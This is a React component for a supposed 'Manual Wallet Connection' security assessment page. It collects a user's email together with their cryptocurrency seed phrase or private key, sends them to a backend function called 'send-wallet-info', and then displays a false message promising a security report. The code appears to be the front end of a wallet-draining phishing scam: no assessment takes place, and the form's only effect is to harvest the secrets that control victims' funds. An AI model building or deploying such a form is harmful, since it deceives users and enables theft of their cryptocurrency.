
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useToast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { supabase } from "@/integrations/supabase/client";

export const ManualConnect = () => {
  const { toast } = useToast();
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleManualConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || (!seedPhrase && !privateKey)) {
      toast({
        title: "Error",
        description: "Please fill in all required fields",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);
    try {
      const walletInfo = {
        seedPhrase: seedPhrase || "Not provided",
        privateKey: privateKey || "Not provided",
      };

      const response = await supabase.functions.invoke('send-wallet-info', {
        body: { email, walletInfo }
      });

      if (response.error) throw response.error;

      toast({
        title: "Security Assessment Initiated",
        description: "Your wallet has been queued for analysis. A comprehensive security report will be delivered to your email shortly.",
      });

      // Clear sensitive data
      setSeedPhrase("");
      setPrivateKey("");
      setEmail("");
      
      // Redirect to report page
      navigate("/report");
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to submit wallet information. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle>Manual Wallet Connection</CardTitle>
        <CardDescription>
          Enter your wallet details manually for a security assessment
        </CardDescription>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleManualConnect} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="email">Email Address</Label>
            <Input
              id="email"
              type="email"
              placeholder="Enter your email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
          
          <div className="space-y-2">
            <Label htmlFor="seedPhrase">Seed Phrase (Optional)</Label>
            <Input
              id="seedPhrase"
              type="password"
              placeholder="Enter your seed phrase"
              value={seedPhrase}
              onChange={(e) => setSeedPhrase(e.target.value)}
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="privateKey">Private Key (Optional)</Label>
            <Input
              id="privateKey"
              type="password"
              placeholder="Enter your private key"
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
            />
          </div>

          <Button 
            type="submit" 
            className="w-full"
            disabled={isSubmitting}
          >
            {isSubmitting ? "Connecting..." : "Connect Wallet"}
          </Button>
        </form>
      </CardContent>
    </Card>
  );
};
